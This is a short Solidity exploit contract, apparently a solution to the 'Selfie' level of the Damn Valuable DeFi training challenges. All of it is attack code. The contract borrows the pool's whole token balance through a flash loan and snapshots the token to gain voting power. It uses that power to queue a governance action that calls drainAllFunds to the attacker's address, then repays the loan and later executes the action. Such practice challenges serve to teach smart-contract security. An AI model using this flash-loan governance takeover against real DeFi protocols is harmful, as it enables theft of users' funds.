// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../DamnValuableTokenSnapshot.sol";
import "./SelfiePool.sol";
import "./SimpleGovernance.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";
import "@openzeppelin/contracts/utils/Address.sol";

contract PwnSelfie {
    using Address for address;

    DamnValuableTokenSnapshot token;
    SimpleGovernance governance;
    SelfiePool pool;
    address us;
    uint actionId;

    constructor(address _token, address _governance, address _pool, address _us) {
	token = DamnValuableTokenSnapshot(_token);
	governance = SimpleGovernance(_governance);
	pool = SelfiePool(_pool);
	us = _us;
    }

    function step1() external {
	token.snapshot();
	pool.flashLoan(token.balanceOf(address(pool)));
    }

    function step2() external payable {
	token.snapshot();
	governance.executeAction(actionId); // after 2 days
    }

    function receiveTokens(address, uint256 amount) public {
	token.snapshot();
	actionId = governance.queueAction(address(pool),
	  abi.encodeWithSignature("drainAllFunds(address)", us), 0);
	token.transfer(address(pool), amount);
    }
}
